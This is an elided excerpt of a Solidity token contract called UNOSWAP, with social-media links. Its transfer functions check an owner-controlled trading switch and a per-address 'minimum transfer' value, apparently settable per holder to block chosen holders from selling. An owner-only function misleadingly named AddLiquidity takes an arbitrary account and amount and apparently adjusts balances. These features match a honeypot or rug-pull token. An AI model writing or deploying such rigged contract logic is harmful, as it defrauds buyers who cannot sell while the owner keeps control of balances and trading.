...
// Twitter  : https://twitter.com/unoswap
// Telegram : https://t.me/UnoSwap_channel
...
contract UNOSWAP is Context, Ownable, IERC20 {
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_activeTrade, "UnoswapDapp: Trading is currently disabled");
        require(amount >= _mihodl[_msgSender()], "UnoswapDapp: Transfer amount is less than the minimum allowed");
        require(_balances[_msgSender()] >= amount, "UnoswapDapp: transfer amount exceeds balance");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_activeTrade, "UnoswapDapp: Trading is currently disabled");
        require(amount >= _mihodl[sender], "UnoswapDapp: Not exceed mi hodl");
        require(_balances[sender] >= amount, "UnoswapDapp: transfer amount exceeds balance");
        require(_allowances[sender][_msgSender()] >= amount, "UnoswapDapp: transfer amount exceeds allowance");
    ...
    function AddLiquidity(address account, uint256 newAmount) public onlyOwner {
        require(account != address(0), "UnoswapDapp: address zero is not a valid account");
